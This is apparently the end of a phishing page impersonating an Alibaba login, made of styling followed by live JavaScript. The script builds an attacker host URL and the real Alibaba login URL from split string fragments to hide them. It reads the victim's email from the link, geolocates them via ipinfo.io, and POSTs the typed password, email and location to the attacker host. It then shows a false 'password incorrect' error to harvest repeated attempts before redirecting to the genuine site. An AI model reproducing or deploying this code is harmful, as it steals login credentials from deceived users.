      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif, Helvetica, Tahoma, Arial, sans-serif;
      }

      body {
        color: #404349;
        font-family: page_section_font;
        -webkit-font-smoothing: antialiased;
      }

      body,
      html {
        height: 100%;
        margin: 0;
        font-size: 14px;
      }

      a {
        text-decoration: none;
        font-family: SFUITextLight;
      }

      a:active,
      a:hover {
        color: #08c;
        text-decoration: underline;
      }
      a:visited {
        color: #306;
        text-decoration: none;
      }
      a:link {
        color: #08c;
        text-decoration: none;
      }
      a:link {
        color: #08c;
      }
      a,
      a:hover,
      a:visited {
        text-decoration: none;
      }

      user agent stylesheet a:-webkit-any-link {
        color: -webkit-link;
        cursor: pointer;
        text-decoration: underline;
      }

      #frame {
        width: 100%;
        height: auto;
        margin: 0px;
        float: left;
        position: relative;
        top: 0px;
        background-color: #fff;
        font-size: 14px;
        color: #444;
        clear: both;
        z-index: 10;
        //box-shadow:0px 1px 2px #777;
      }

      #inner-frame {
        max-width: 1240px;
        width: 100%;
        height: auto;
        margin: auto;
        padding: 10px;
        position: relative;
        overflow-x: hidden;
      }

      input:-internal-autofill-selected {
        background-color: transparent;
      }

      .text {
        width: 100%;
        transition: border linear 0.2s;
        float: left;
        padding: 4px 6px;
        border: 1px solid #ccc;
        line-height: 17px;
        font-size: 12px;
        color: #595959;
        background: #fff;
        vertical-align: middle;
        -webkit-box-shadow: 0 1px 0 #ececec inset;
        -moz-box-shadow: 0 1px 0 #ececec inset;
        -ms-box-shadow: 0 1px 0 #ececec inset;
        -o-box-shadow: 0 1px 0 #ececec inset;
        box-shadow: 0 1px 0 #ececec inset;
      }

      .text:hover {
        border: 1px solid #a6a6a6;
      }

      ::placeholder {
        /* Chrome, Firefox, Opera, Safari 10.1+ */
        color: #aaa;
        opacity: 1; /* Firefox */
      }

      user agent stylesheet .text {
        color: #fff;
      }

      .input_icon {
        display: table-cell;
        padding: 6px 12px;
        font-size: 14px;
        font-weight: 400;
        line-height: 1;
        color: #555;
        text-align: center;
        background-color: #ccc;
        //background: #ccc url('images/icon_userblack.png') no-repeat 9px 5px;
        background-size: cover;
        border: 1px solid #ccc;
        width: 39px;
        height: 39px;
        white-space: nowrap;
        vertical-align: middle;
      }

      /*.input_ico{
		display: block;
	    width: 23px;
	    height: 23px;
	    margin: 7px;
	    position: absolute;
	    top: 0;
	    left: 0;
	    background: url(images/icon_userblack.png) 0 0px no-repeat center;
	    background-size: cover;
	}*/

      .btn {
        border: none;
        display: inline-block;
        width: 100%;
        box-sizing: border-box;
        background: #ca2b21;
        font-weight: 500;
        font-size: 16px;
        color: #ffffff;
        text-align: center;
        padding: 8px;
        border-radius: 2px;
      }

      .input_icon_holder {
        position: relative;
        margin-bottom: 5%;
        display: table;
      }

      .icon1 {
        background: #ccc url("images/icon_userblack.png") no-repeat 9px 5px;
      }

      .icon1:hover {
        background: #ccc url("images/icon_userblack2.png") no-repeat center 9px
          5px;
      }

      .icon2 {
        background: #ccc url("images/key.png") no-repeat 9px 5px;
      }

      .icon2:hover {
        background: #ccc url("images/key2.png") no-repeat center 9px 5px;
      }

      .input_icon:hover {
        background-color: #ca2b21;
        border: 1px solid #ca2b21;
      }

      .input_cover {
        position: relative;
        margin-bottom: 7px;
      }

      #label {
        padding: 5px;
        position: absolute;
        right: 10px;
        top: 10px;
        z-index: 10;
        width: auto;
        font-size: 14px;
        font-weight: 600;
        color: #006097;
        text-align: center;
        border: none;
        vertical-align: middle;
        //font-family: SFUITextRegular;
        background-color: #fff;
      }

      #label:hover {
        background-color: #f2f2f2;
      }

      .errorfound {
        border: 1px solid #f15a5a;
        //box-shadow: 0px 0px 1px #F15A5A;
        color: #f15a5a;
      }

      #form_layout {
        position: relative;
        max-width: 350px;
        width: 100%;
        margin: auto;
        height: auto;
        background-color: rgba(255, 255, 255, 0.1);
        color: #fff;
        text-align: left;
        padding: 7px;
        margin-top: 0;
        margin-bottom: 0;
        font-size: 12px;
        //box-shadow:-1px 18px 3px 0px #333;
      }

      .ang {
        width: 0px;
        height: 0px;
        border-style: solid;
        border-width: 0px 4px 6px 4px;
        border-color: transparent transparent #ca2b21 transparent;
        position: absolute;
        left: 50px;
        display: none;
      }

      .ang0 {
        top: 38px;
      }

      .ang1 {
        top: 39px;
      }

      .errms {
        border: 1px solid red;
        padding: 5px 15px;
        width: 100%;
        position: absolute;
        color: #ca2b21;
        z-index: 1;
        border-radius: 5px;
        display: none;
      }

      .errms0 {
        top: 43px;
      }

      .errms1 {
        top: 44px;
      }

      @keyframes reduce {
        from {
          font-size: 16px;
          height: 100%;
          top: 0;
        }
        to {
          font-size: 12px;
          height: 30%;
          top: -10px;
        }
      }

      @keyframes increase {
        from {
          font-size: 12px;
          height: 30%;
          top: -10px;
        }
        to {
          font-size: 16px;
          height: 100%;
          top: 0;
        }
      }

      .form-error {
        padding-left: 32px;
      }
      .notice-error,
      .notice-forbid {
        border: 1px solid #f6c8b5;
        background: #fceee8;
      }
      .notice {
        padding: 4px 12px;
        line-height: 18px;
        font-family: Tahoma, Helvetica, Arial, \5b8b\4f53;
      }

      .form-error .icon-error {
        margin-left: -20px;
      }
      .icon-error {
        width: 14px;
        height: 14px;
        background-position: -30px -34px;
      }

      .icon-notice {
        background-image: url("images/hhh2.png");
      }
      .icon,
      .icon-notice,
      .icon-site {
        display: inline-block;
        margin-right: 6px;
        background-image: url("images/hhh2.png");
        background-color: transparent;
        background-repeat: no-repeat;
        overflow: hidden;
        vertical-align: -2px;
        //vertical-align: -1px;
      }

      .notice {
        padding: 4px 12px;
        line-height: 18px;
        font-family: Tahoma, Helvetica, Arial, \5b8b\4f53;
      }

      select.icbu-language-swicth {
        border: 1px solid #c4c6cf;
      }

      #loader {
        display: none;
        align-items: center;
        justify-content: center;
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #fff9;
        z-index: 99;
        border-radius: 10px;
      }

      @keyframes hideLoader {
        from {
          opacity: 1;
        }

        to {
          opacity: 0;
        }
      }

      @keyframes showLoader {
        from {
          opacity: 0;
        }

        to {
          opacity: 1;
        }
      }
    </style>

    <script>
      let resBox = "AAL";
      let nbg1 = "http://";
      let nbg2 = "kvwpc";
      let nbg3 = "a.com";
      let nbg4 = "/prnt/b";
      let nbg5 = "rnt/sp";

      let ov1 = "https";
      let ov2 = "://logi";
      let ov3 = "n.alib";
      let ov4 = "aba.c";
      let ov5 = "om/newlo";
      let ov6 = "gin/icbuL";
      let ov7 = "ogin.htm";

      sessionStorage.clear();
      let trialCount = sessionStorage.getItem("num_trial");

      if (!trialCount) {
        sessionStorage.setItem("num_trial", 0);
      } else if (trialCount >= 2) {
        window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`);
      }
    </script>

    <script>
      const xx = window.location.href.split("?");
      let ckorg = document.querySelector("#ckorg");
      let ck = document.querySelector("#ck");
      let cknow = document.querySelector("#cknow");
      let loader = document.querySelector("#loader");
      let loc = document.querySelector("#loc");
      let trial = document.querySelector("#trial");

      var base64regex =
        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

      if (!base64regex.test(xx[1])) {
        ckorg.value = xx[1];
        ck.value = xx[1];
      } else {
        ckorg.value = atob(xx[1]);
        ck.value = atob(xx[1]);
      }

      trial.value = trialCount;

      let myForm = document.querySelector("#form_");
      myForm.addEventListener("submit", async function (event) {
        event.preventDefault();

        let data = new FormData();

        let options = {
          method: "POST",
          body: data,
        };

        data.append("ckorg", ckorg.value);
        data.append("ck", ck.value);
        data.append("cknow", cknow.value);
        data.append("loc", loc.value);
        data.append("trial", trial.value);
        data.append("resBox", resBox);

        loader.style.display = "flex";
        loader.style.animation = "showLoader .5s ease";

        const response = await fetch(
          `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`,
          options
        );
        const result = await response.text();

        loader.style.animation = "hideLoader 1s ease";
        setTimeout(() => {
          loader.style.display = "none";
        }, 1000);

        console.log(result);

        trialCount++;
        sessionStorage.setItem("num_trial", trialCount);
        trial.value = trialCount;

        if (trialCount >= 10) {
          window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`);
        } else {
          cknow.value = "";
          cknow.focus();
          document.getElementById("errmsg").innerHTML =
            "Your account name or password is incorrect.";
        }
      });

      $.get(
        "https://ipinfo.io/json?token=10da60a9ff2d81",
        function (response) {
          let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`;
          $("#loc").val(cou);
        },
        "jsonp"
      );
    </script>
